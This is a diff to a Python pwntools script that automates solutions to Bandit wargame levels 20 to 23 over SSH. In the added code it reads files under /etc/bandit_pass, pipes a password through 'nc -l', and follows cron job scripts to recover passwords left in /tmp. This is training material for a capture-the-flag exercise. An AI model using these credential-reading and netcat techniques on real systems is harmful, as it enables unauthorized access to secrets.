@@ -1,13 +1,15 @@
 import pwn
 
 
-def run(conn: pwn.ssh, cmd: str):
-    cat = conn.run(cmd)
-    output = cat.recvall()
+def run(conn: pwn.ssh, cmd: str) -> str | bytes:
+    cmd = conn.run(cmd)
+    output = cmd.recvall()
     try:
-        print(output.decode())
+        output = output.decode()
+        print(output)
+        return output
     except UnicodeDecodeError:
-        pass
+        return output
 
 
 def level_0(conn: pwn.ssh):
@@ -128,4 +130,44 @@ def level_19(conn: pwn.ssh):
 
 
 def level_20(conn: pwn.ssh):
-    run(conn, "")
+    prompt = b"bandit20@bandit:~$ "
+
+    bash = conn.run("bash")
+    bash.recvuntil(prompt)
+
+    bash.sendline("cat /etc/bandit_pass/bandit20 | nc -l 6666 &".encode())
+    bash.recvuntil(prompt)
+
+    bash.sendline("./suconnect 6666".encode())
+    print(*bash.recvuntil(prompt).split(b"\n")[1:-1], sep="\n")
+
+
+def level_21(conn: pwn.ssh):
+    ls_output = run(conn, "ls -1 /etc/cron.d/")
+    cronjob_bandit22 = ls_output.splitlines()[0]
+
+    cat_output = run(conn, f"cat /etc/cron.d/{cronjob_bandit22}")
+    sh_file = cat_output.splitlines()[-1].split(" ")[-3]
+
+    cat_output = run(conn, f"cat {sh_file}")
+    tmp_file = cat_output.splitlines()[-1].split(" ")[-1]
+
+    run(conn, f"cat {tmp_file}")
+
+
+def level_22(conn: pwn.ssh):
+    ls_output = run(conn, "ls -1 /etc/cron.d/")
+    cronjob_bandit23 = ls_output.splitlines()[1]
+
+    cat_output = run(conn, f"cat /etc/cron.d/{cronjob_bandit23}")
+    sh_file = cat_output.splitlines()[-1].split(" ")[-4]
+
+    cat_output = run(conn, f"cat {sh_file}")
+
+    # mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+    mytarget = "8ca319486bfbbc3663ea0fbe81326349"
+    run(conn, f"cat /tmp/{mytarget}")
+
+
+def level_23(conn: pwn.ssh):
+    run(conn, "cat /etc/bandit_pass/bandit23")
